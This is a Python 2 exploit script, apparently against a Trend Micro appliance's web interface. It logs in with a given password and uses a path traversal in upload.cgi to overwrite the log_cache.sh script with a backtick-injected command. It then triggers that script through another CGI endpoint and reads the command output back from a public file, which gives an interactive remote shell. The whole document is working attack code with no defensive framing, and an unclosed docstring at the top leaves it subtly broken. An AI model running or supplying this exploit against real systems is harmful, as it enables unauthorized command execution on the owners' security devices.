#!/usr/local/bin/python
"""

import sys
import re
import requests

requests.packages.urllib3.disable_warnings()

if len(sys.argv) != 3:
    print "(+) usage: %s <target> <pass>" % sys.argv[0]
    print "(+) eg: %s 172.16.175.123 admin123" % sys.argv[0]
    sys.exit(-1)

t = sys.argv[1]
p = sys.argv[2]

bu = "https://%s/" % t
l_url = "%scgi-bin/logon.cgi" % bu
u_url = "%scgi-bin/upload.cgi?dID=../../opt/TrendMicro/MinorityReport/www/cgi-bin/log_cache.sh" % bu
e_url = "%scgi-bin/log_query_system.cgi" % bu
r_url = "%snonprotect/si.txt" % bu

s = requests.Session()

# first we login...

r = s.post(l_url, data={ "passwd":p, "isCookieEnable":1 }, verify=False)
if "frame.cgi" in r.text:
    print "(+) logged in..."
    print "(+) popping shell, type 'exit' to exit."
    cmd = ''
    while (cmd.lower() != "exit"):
        cmd = raw_input("$ ")
        if cmd.lower() == "exit":
            continue

        # now we upload to crush the log_cache.sh script
        bd = "`%s>/opt/TrendMicro/MinorityReport/www/nonprotect/si.txt`" % cmd
        u = {
            'ajaxuploader_file': ('si', bd, 'text/plain'), 
        }
        r = s.post(u_url, files=u, verify=False)
        
        # now we have to get the cmd executed...
        r = s.post(e_url, data={'act':'search','cache_id':''}, verify=False)

        # now we get the result
        r = s.get(r_url, verify=False)
        print r.text.rstrip()
else:
    print "(-) login failed"
    sys.exit(-1)
